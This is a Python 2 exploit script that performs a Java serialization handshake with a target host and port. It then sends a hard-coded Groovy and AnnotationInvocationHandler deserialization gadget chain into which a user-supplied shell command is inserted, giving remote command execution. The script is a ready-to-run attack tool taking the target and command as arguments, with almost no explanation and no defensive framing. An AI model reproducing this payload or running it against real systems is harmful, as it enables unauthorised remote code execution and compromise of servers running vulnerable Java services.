#!/usr/bin/python
# Socket: Needed to send data to the port socket of the target host.
# Sys: Needed to exit the python program if we are unable to connect to the target host.
import socket, sys

class production():
	def __init__(self, var_target_IP, var_target_port):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.rhost = var_target_IP
		self.rport = int(var_target_port)

	def exchange_hello(self):
		#1. client: aced0005
		#2. server: aced0005
		#3. server: 7704
		#4. server: f000baaa
		self.sock.connect((self.rhost, self.rport))
		self.sock.send('\xac\xed\x00\x05')

		response = self.sock.recv(4)
		print('Received #2: ' + response)

		response = self.sock.recv(2).encode('hex')
		print('Received #3: ' + response)

		response = self.sock.recv(4).encode('hex')
		print('Received #4: ' + response)

	def exchange_version(self):
		#5. client: 7704
		self.sock.send('\x77\x04')
		#6. client: f000baaa
		self.sock.send('\xf0\x00\xba\xaa')
		#7. server: 7702
		response = self.sock.recv(2).encode('hex')
		print('Received #7 ' + response)
		#8. server: 0101
		response = self.sock.recv(2).encode('hex')
		print('Received #8 ' + response)
		#i. client: 7702
		self.sock.send('\x77\x02')
		#10. client: 0101
		self.sock.send('\x01\x01')

	def exchange_client_name(self):
		#11. client: 77 followed by the lenght of the string for the name + 2. So, 07 for five character 'Henry' name.
		self.sock.send('\x77\x07\x00\x05')
		self.sock.send('Henry')

	def send_exploit(self, var_command_input):
		# payload = ""
		# with open(payload_file, 'rb') as content_file:
		# 	payload = content_file.read()
		payload = b''
		payload += b'\xac\xed\x00\x05\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e'
		payload += b'\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca'
		payload += b'\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61'
		payload += b'\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61'
		payload += b'\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x73\x7d\x00\x00\x00\x01\x00\x0d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x4d'
		payload += b'\x61\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1'
		payload += b'\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65'
		payload += b'\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x2c'
		payload += b'\x6f\x72\x67\x2e\x63\x6f\x64\x65\x68\x61\x75\x73\x2e\x67\x72\x6f\x6f\x76\x79\x2e\x72\x75\x6e\x74\x69\x6d\x65\x2e\x43\x6f'
		payload += b'\x6e\x76\x65\x72\x74\x65\x64\x43\x6c\x6f\x73\x75\x72\x65\x10\x23\x37\x19\xf7\x15\xdd\x1b\x02\x00\x01\x4c\x00\x0a\x6d\x65'
		payload += b'\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78'
		payload += b'\x72\x00\x2d\x6f\x72\x67\x2e\x63\x6f\x64\x65\x68\x61\x75\x73\x2e\x67\x72\x6f\x6f\x76\x79\x2e\x72\x75\x6e\x74\x69\x6d\x65'
		payload += b'\x2e\x43\x6f\x6e\x76\x65\x72\x73\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x10\x23\x37\x1a\xd6\x01\xbc\x1b\x02\x00\x02\x4c'
		payload += b'\x00\x08\x64\x65\x6c\x65\x67\x61\x74\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74'
		payload += b'\x3b\x4c\x00\x0b\x68\x61\x6e\x64\x6c\x65\x43\x61\x63\x68\x65\x74\x00\x28\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x63'
		payload += b'\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x2f\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x48\x61\x73\x68\x4d\x61\x70\x3b\x78\x70'
		payload += b'\x73\x72\x00\x29\x6f\x72\x67\x2e\x63\x6f\x64\x65\x68\x61\x75\x73\x2e\x67\x72\x6f\x6f\x76\x79\x2e\x72\x75\x6e\x74\x69\x6d'
		payload += b'\x65\x2e\x4d\x65\x74\x68\x6f\x64\x43\x6c\x6f\x73\x75\x72\x65\x11\x0e\x3e\x84\x8f\xbd\xce\x48\x02\x00\x01\x4c\x00\x06\x6d'
		payload += b'\x65\x74\x68\x6f\x64\x71\x00\x7e\x00\x09\x78\x72\x00\x13\x67\x72\x6f\x6f\x76\x79\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x6f\x73'
		payload += b'\x75\x72\x65\x3c\xa0\xc7\x66\x16\x12\x6c\x5a\x02\x00\x08\x49\x00\x09\x64\x69\x72\x65\x63\x74\x69\x76\x65\x49\x00\x19\x6d'
		payload += b'\x61\x78\x69\x6d\x75\x6d\x4e\x75\x6d\x62\x65\x72\x4f\x66\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x73\x49\x00\x0f\x72\x65\x73'
		payload += b'\x6f\x6c\x76\x65\x53\x74\x72\x61\x74\x65\x67\x79\x4c\x00\x03\x62\x63\x77\x74\x00\x3c\x4c\x6f\x72\x67\x2f\x63\x6f\x64\x65'
		payload += b'\x68\x61\x75\x73\x2f\x67\x72\x6f\x6f\x76\x79\x2f\x72\x75\x6e\x74\x69\x6d\x65\x2f\x63\x61\x6c\x6c\x73\x69\x74\x65\x2f\x42'
		payload += b'\x6f\x6f\x6c\x65\x61\x6e\x43\x6c\x6f\x73\x75\x72\x65\x57\x72\x61\x70\x70\x65\x72\x3b\x4c\x00\x08\x64\x65\x6c\x65\x67\x61'
		payload += b'\x74\x65\x71\x00\x7e\x00\x0b\x4c\x00\x05\x6f\x77\x6e\x65\x72\x71\x00\x7e\x00\x0b\x5b\x00\x0e\x70\x61\x72\x61\x6d\x65\x74'
		payload += b'\x65\x72\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x4c\x00'
		payload += b'\x0a\x74\x68\x69\x73\x4f\x62\x6a\x65\x63\x74\x71\x00\x7e\x00\x0b\x78\x70\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00'
		payload += b'\x70\x74\x00'

		payload += chr(len(var_command_input)).encode()
		payload += var_command_input.encode()

		payload += b'\x71\x00\x7e\x00\x13\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab'
		payload += b'\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x78\x70\x00\x00\x00\x02\x76\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e'
		payload += b'\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x76\x72\x00\x0c\x6a\x61\x76\x61'
		payload += b'\x2e\x69\x6f\x2e\x46\x69\x6c\x65\x04\x2d\xa4\x45\x0e\x0d\xe4\xff\x03\x00\x01\x4c\x00\x04\x70\x61\x74\x68\x71\x00\x7e\x00'
		payload += b'\x09\x78\x70\x70\x74\x00\x07\x65\x78\x65\x63\x75\x74\x65\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x63\x6f'
		payload += b'\x6e\x63\x75\x72\x72\x65\x6e\x74\x2e\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x48\x61\x73\x68\x4d\x61\x70\x64\x99\xde\x12'
		payload += b'\x9d\x87\x29\x3d\x03\x00\x03\x49\x00\x0b\x73\x65\x67\x6d\x65\x6e\x74\x4d\x61\x73\x6b\x49\x00\x0c\x73\x65\x67\x6d\x65\x6e'
		payload += b'\x74\x53\x68\x69\x66\x74\x5b\x00\x08\x73\x65\x67\x6d\x65\x6e\x74\x73\x74\x00\x31\x5b\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69'
		payload += b'\x6c\x2f\x63\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x2f\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x48\x61\x73\x68\x4d\x61\x70'
		payload += b'\x24\x53\x65\x67\x6d\x65\x6e\x74\x3b\x78\x70\x00\x00\x00\x0f\x00\x00\x00\x1c\x75\x72\x00\x31\x5b\x4c\x6a\x61\x76\x61\x2e'
		payload += b'\x75\x74\x69\x6c\x2e\x63\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x2e\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x48\x61\x73\x68'
		payload += b'\x4d\x61\x70\x24\x53\x65\x67\x6d\x65\x6e\x74\x3b\x52\x77\x3f\x41\x32\x9b\x39\x74\x02\x00\x00\x78\x70\x00\x00\x00\x10\x73'
		payload += b'\x72\x00\x2e\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x63\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x2e\x43\x6f\x6e\x63\x75\x72'
		payload += b'\x72\x65\x6e\x74\x48\x61\x73\x68\x4d\x61\x70\x24\x53\x65\x67\x6d\x65\x6e\x74\x1f\x36\x4c\x90\x58\x93\x29\x3d\x02\x00\x01'
		payload += b'\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x78\x72\x00\x28\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x63\x6f\x6e'
		payload += b'\x63\x75\x72\x72\x65\x6e\x74\x2e\x6c\x6f\x63\x6b\x73\x2e\x52\x65\x65\x6e\x74\x72\x61\x6e\x74\x4c\x6f\x63\x6b\x66\x55\xa8'
		payload += b'\x2c\x2c\xc8\x6a\xeb\x02\x00\x01\x4c\x00\x04\x73\x79\x6e\x63\x74\x00\x2f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x63'
		payload += b'\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x2f\x6c\x6f\x63\x6b\x73\x2f\x52\x65\x65\x6e\x74\x72\x61\x6e\x74\x4c\x6f\x63\x6b\x24'
		payload += b'\x53\x79\x6e\x63\x3b\x78\x70\x73\x72\x00\x34\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x63\x6f\x6e\x63\x75\x72\x72\x65\x6e'
		payload += b'\x74\x2e\x6c\x6f\x63\x6b\x73\x2e\x52\x65\x65\x6e\x74\x72\x61\x6e\x74\x4c\x6f\x63\x6b\x24\x4e\x6f\x6e\x66\x61\x69\x72\x53'
		payload += b'\x79\x6e\x63\x65\x88\x32\xe7\x53\x7b\xbf\x0b\x02\x00\x00\x78\x72\x00\x2d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x63\x6f'
		payload += b'\x6e\x63\x75\x72\x72\x65\x6e\x74\x2e\x6c\x6f\x63\x6b\x73\x2e\x52\x65\x65\x6e\x74\x72\x61\x6e\x74\x4c\x6f\x63\x6b\x24\x53'
		payload += b'\x79\x6e\x63\xb8\x1e\xa2\x94\xaa\x44\x5a\x7c\x02\x00\x00\x78\x72\x00\x35\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x63\x6f'
		payload += b'\x6e\x63\x75\x72\x72\x65\x6e\x74\x2e\x6c\x6f\x63\x6b\x73\x2e\x41\x62\x73\x74\x72\x61\x63\x74\x51\x75\x65\x75\x65\x64\x53'
		payload += b'\x79\x6e\x63\x68\x72\x6f\x6e\x69\x7a\x65\x72\x66\x55\xa8\x43\x75\x3f\x52\xe3\x02\x00\x01\x49\x00\x05\x73\x74\x61\x74\x65'
		payload += b'\x78\x72\x00\x36\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x63\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x2e\x6c\x6f\x63\x6b\x73'
		payload += b'\x2e\x41\x62\x73\x74\x72\x61\x63\x74\x4f\x77\x6e\x61\x62\x6c\x65\x53\x79\x6e\x63\x68\x72\x6f\x6e\x69\x7a\x65\x72\x33\xdf'
		payload += b'\xaf\xb9\xad\x6d\x6f\xa9\x02\x00\x00\x78\x70\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00'
		payload += b'\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73'
		payload += b'\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00'
		payload += b'\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73'
		payload += b'\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00'
		payload += b'\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73'
		payload += b'\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00'
		payload += b'\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73'
		payload += b'\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00'
		payload += b'\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x73'
		payload += b'\x71\x00\x7e\x00\x20\x73\x71\x00\x7e\x00\x24\x00\x00\x00\x00\x3f\x40\x00\x00\x70\x70\x78\x74\x00\x08\x65\x6e\x74\x72\x79'
		payload += b'\x53\x65\x74\x76\x72\x00\x12\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x76\x65\x72\x72\x69\x64\x65\x00\x00\x00\x00\x00'
		payload += b'\x00\x00\x00\x00\x00\x00\x78\x70'

		self.sock.send(payload[4:])

try:
  var_target_IP = sys.argv[1]
  var_target_port = sys.argv[2]
  var_command_input = sys.argv[3]
except:
  print "Usage %s <target IP> <target port> <command to execute surrounded by quotes>" % sys.argv[0]
  exit()

start = production(var_target_IP, var_target_port)
start.exchange_hello()
start.exchange_version()
start.exchange_client_name()
start.send_exploit(var_command_input)

# Create your own payload: https://youtu.be/krC5j1Ab44I?t=1985
